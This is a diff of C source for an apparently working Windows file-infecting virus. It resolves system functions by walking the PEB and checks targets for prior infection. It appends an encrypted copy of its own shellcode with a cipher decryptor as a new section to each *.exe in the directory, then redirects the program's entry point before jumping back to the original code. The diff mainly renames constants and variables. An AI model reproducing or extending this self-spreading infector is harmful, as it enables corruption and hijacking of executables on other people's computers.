@@ -1,19 +1,14 @@
 #include <Windows.h>
 
-#include "R.h"
+#include "banner.h"
 #include "ciphers.h"
-#include "peb-lookup.h"
+#include "pebLookup.h"
 #include "prototype.h"
 
 #define MEM_ALIGN(operand, alignment) ((operand + (alignment - 1)) & ~(alignment - 1))
 
-void banner(protoLoadLibraryA _LoadLibraryA, protoGetProcAddress _GetProcAddress) {
-    HMODULE User32Dll = _LoadLibraryA(aUser32Dll);
-#pragma GCC diagnostic ignored "-Wcast-function-type"
-    protoMessageBoxA _MessageBoxA = (protoMessageBoxA)_GetProcAddress(User32Dll, aMessageBoxA);
-#pragma GCC diagnostic pop
-    _MessageBoxA(0, aBocchiTheRock, aHehehe, MB_OK);
-}
+int jmpOffset = 0x13;
+int passingParamsOpcodeSize = 30;
 
 PIMAGE_SECTION_HEADER getShellcodeSection(LPVOID baseAddress) {
     PIMAGE_DOS_HEADER dosHeader = baseAddress;
@@ -60,11 +55,11 @@ int getFileAlignment(protoCreateFileMappingA _CreateFileMappingA, protoMapViewOf
 
 BOOL isInfected(HANDLE kernel32, protoGetProcAddress _GetProcAddress, LPCSTR fileName) {
 #pragma GCC diagnostic ignored "-Wcast-function-type"
-    protoCloseHandle _CloseHandle = (protoCloseHandle)_GetProcAddress(kernel32, aCloseHandle);
-    protoCreateFileA _CreateFileA = (protoCreateFileA)_GetProcAddress(kernel32, aCreateFileA);
-    protoCreateFileMappingA _CreateFileMappingA = (protoCreateFileMappingA)_GetProcAddress(kernel32, aCreateFileMappingA);
-    protoMapViewOfFile _MapViewOfFile = (protoMapViewOfFile)_GetProcAddress(kernel32, aMapViewOfFile);
-    protoUnmapViewOfFile _UnmapViewOfFile = (protoUnmapViewOfFile)_GetProcAddress(kernel32, aUnmapViewOfFile);
+    protoCloseHandle _CloseHandle = (protoCloseHandle)_GetProcAddress(kernel32, "CloseHandle");
+    protoCreateFileA _CreateFileA = (protoCreateFileA)_GetProcAddress(kernel32, "CreateFileA");
+    protoCreateFileMappingA _CreateFileMappingA = (protoCreateFileMappingA)_GetProcAddress(kernel32, "CreateFileMappingA");
+    protoMapViewOfFile _MapViewOfFile = (protoMapViewOfFile)_GetProcAddress(kernel32, "MapViewOfFile");
+    protoUnmapViewOfFile _UnmapViewOfFile = (protoUnmapViewOfFile)_GetProcAddress(kernel32, "UnmapViewOfFile");
 #pragma GCC diagnostic pop
 
     HANDLE file = _CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -132,18 +127,18 @@ BOOL tlsInject(LPVOID baseAddress, ULONG_PTR callbackAddress) {
 }
 
 int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress _GetProcAddress, LPCSTR fileName) {
-    HANDLE ntdll = _LoadLibraryA(aNtDll);
+    HANDLE ntdll = _LoadLibraryA("NtDll.dll");
 
 #pragma GCC diagnostic ignored "-Wcast-function-type"
-    protoRtlCopyMemory _RtlCopyMemory = (protoRtlCopyMemory)_GetProcAddress(ntdll, aRtlCopyMemory);
+    protoRtlCopyMemory _RtlCopyMemory = (protoRtlCopyMemory)_GetProcAddress(ntdll, "RtlCopyMemory");
 
-    protoCloseHandle _CloseHandle = (protoCloseHandle)_GetProcAddress(kernel32, aCloseHandle);
-    protoCreateFileA _CreateFileA = (protoCreateFileA)_GetProcAddress(kernel32, aCreateFileA);
-    protoCreateFileMappingA _CreateFileMappingA = (protoCreateFileMappingA)_GetProcAddress(kernel32, aCreateFileMappingA);
-    protoGetFileSize _GetFileSize = (protoGetFileSize)_GetProcAddress(kernel32, aGetFileSize);
-    protoGetModuleFileNameA _GetModuleFileNameA = (protoGetModuleFileNameA)_GetProcAddress(kernel32, aGetModuleFileNameA);
-    protoMapViewOfFile _MapViewOfFile = (protoMapViewOfFile)_GetProcAddress(kernel32, aMapViewOfFile);
-    protoUnmapViewOfFile _UnmapViewOfFile = (protoUnmapViewOfFile)_GetProcAddress(kernel32, aUnmapViewOfFile);
+    protoCloseHandle _CloseHandle = (protoCloseHandle)_GetProcAddress(kernel32, "CloseHandle");
+    protoCreateFileA _CreateFileA = (protoCreateFileA)_GetProcAddress(kernel32, "CreateFileA");
+    protoCreateFileMappingA _CreateFileMappingA = (protoCreateFileMappingA)_GetProcAddress(kernel32, "CreateFileMappingA");
+    protoGetFileSize _GetFileSize = (protoGetFileSize)_GetProcAddress(kernel32, "GetFileSize");
+    protoGetModuleFileNameA _GetModuleFileNameA = (protoGetModuleFileNameA)_GetProcAddress(kernel32, "GetModuleFileNameA");
+    protoMapViewOfFile _MapViewOfFile = (protoMapViewOfFile)_GetProcAddress(kernel32, "MapViewOfFile");
+    protoUnmapViewOfFile _UnmapViewOfFile = (protoUnmapViewOfFile)_GetProcAddress(kernel32, "UnmapViewOfFile");
 #pragma GCC diagnostic pop
 
     char baseFileName[MAX_PATH];
@@ -172,7 +167,7 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
     int targetFileSize = _GetFileSize(target, NULL);
 
     HANDLE targetMapping = _CreateFileMappingA(target, NULL, PAGE_READWRITE, 0,
-                                               MEM_ALIGN(targetFileSize + shellcodeSize + passing_params_opcode_size + 100, fileAlignment), NULL);
+                                               MEM_ALIGN(targetFileSize + shellcodeSize + passingParamsOpcodeSize + 100, fileAlignment), NULL);
     LPVOID targetAddress = _MapViewOfFile(targetMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
 
     PIMAGE_DOS_HEADER dosHeader = targetAddress;
@@ -225,10 +220,10 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
     *(PDWORD64)((ULONG_PTR)targetDecryptorLocation + 22) = encryptionKey;
 
     // Copy decryptor's body
-    _RtlCopyMemory((LPVOID)((ULONG_PTR)targetDecryptorLocation + passing_params_opcode_size), ciphersOpcode[cipherId], ciphersSize[cipherId]);
+    _RtlCopyMemory((LPVOID)((ULONG_PTR)targetDecryptorLocation + passingParamsOpcodeSize), ciphersOpcode[cipherId], ciphersSize[cipherId]);
 
     // Copy shellcode
-    LPVOID targetEncryptedShellcodeLocation = targetDecryptorLocation + passing_params_opcode_size + ciphersSize[cipherId];
+    LPVOID targetEncryptedShellcodeLocation = targetDecryptorLocation + passingParamsOpcodeSize + ciphersSize[cipherId];
 
     // section name != .rssc which means the original injector, no need to decrypt
     if (*(PDWORD64)shellcode->Name != 0x637373722e) {
@@ -236,7 +231,7 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
         _RtlCopyMemory(targetEncryptedShellcodeLocation, rawShellcode, shellcodeSize);
     } else {
         LPVOID decryptorLocation = baseAddress + shellcode->PointerToRawData;
-        DWORD64 decryptorSize = *(PDWORD64)((ULONG_PTR)decryptorLocation + 2) + passing_params_opcode_size;
+        DWORD64 decryptorSize = *(PDWORD64)((ULONG_PTR)decryptorLocation + 2) + passingParamsOpcodeSize;
         DWORD64 encryptedShellcodeSize = *(PDWORD64)((ULONG_PTR)decryptorLocation + 12);
         DWORD64 key = *(PDWORD64)((ULONG_PTR)decryptorLocation + 22);
         int cipherId = key & 1;
@@ -255,17 +250,17 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
     // patch jump relative back to target program's OEP
     *(PDWORD)(targetEncryptedShellcodeLocation + jmpOffset) =
         ntHeaders->OptionalHeader.AddressOfEntryPoint -
-        (newSection->VirtualAddress + passing_params_opcode_size + ciphersSize[cipherId] + jmpOffset + 4);
+        (newSection->VirtualAddress + passingParamsOpcodeSize + ciphersSize[cipherId] + jmpOffset + 4);
 
     // encrypt shellcode
     (*ciphers[cipherId])(targetEncryptedShellcodeLocation, shellcodeSize, encryptionKey);
 
     // if (tlsInject(targetAddress, newSection->VirtualAddress + ntHeaders->OptionalHeader.ImageBase)) {
-        // patch jmp to ret
-        // *(PDWORD)(dest + jmpOffset - 1) = 0xc3;
+    // patch jmp to ret
+    // *(PDWORD)(dest + jmpOffset - 1) = 0xc3;
     // } else {
-        // Change OEP to shellcode
-        ntHeaders->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
+    // Change OEP to shellcode
+    ntHeaders->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
     // }
 
     _UnmapViewOfFile(targetAddress);
@@ -281,15 +276,14 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
 
 void spread(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress _GetProcAddress) {
 #pragma GCC diagnostic ignored "-Wcast-function-type"
-    protoFindFirstFileA _FindFirstFileA = (protoFindFirstFileA)_GetProcAddress(kernel32, aFindFirstFileA);
-    protoFindNextFileA _FindNextFileA = (protoFindNextFileA)_GetProcAddress(kernel32, aFindNextFileA);
-    protoFindClose _FindClose = (protoFindClose)_GetProcAddress(kernel32, aFindClose);
+    protoFindFirstFileA _FindFirstFileA = (protoFindFirstFileA)_GetProcAddress(kernel32, "FindFirstFileA");
+    protoFindNextFileA _FindNextFileA = (protoFindNextFileA)_GetProcAddress(kernel32, "FindNextFileA");
+    protoFindClose _FindClose = (protoFindClose)_GetProcAddress(kernel32, "FindClose");
 #pragma GCC diagnostic pop
 
     WIN32_FIND_DATA ffd;
+    HANDLE hFind = _FindFirstFileA("*.exe", &ffd);
 
-    char exe[] = {'*', '.', 'e', 'x', 'e', 0};
-    HANDLE hFind = _FindFirstFileA(exe, &ffd);
     if (hFind == INVALID_HANDLE_VALUE) {
         return;
     }
@@ -304,10 +298,9 @@ void spread(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddres
 }
 
 int shellcode() {
-    HANDLE kernel32 = getModuleByName(aKernel32Dll);
-
-    LPVOID _LoadLibraryA = getFuncByName(kernel32, aLoadLibraryA);
-    LPVOID _GetProcAddress = getFuncByName(kernel32, aGetProcAddress);
+    HANDLE kernel32 = getModuleByName(L"Kernel32.dll");
+    LPVOID _LoadLibraryA = getFuncByName(kernel32, "LoadLibraryA");
+    LPVOID _GetProcAddress = getFuncByName(kernel32, "GetProcAddress");
 
     banner(_LoadLibraryA, _GetProcAddress);
     spread(kernel32, _LoadLibraryA, _GetProcAddress);
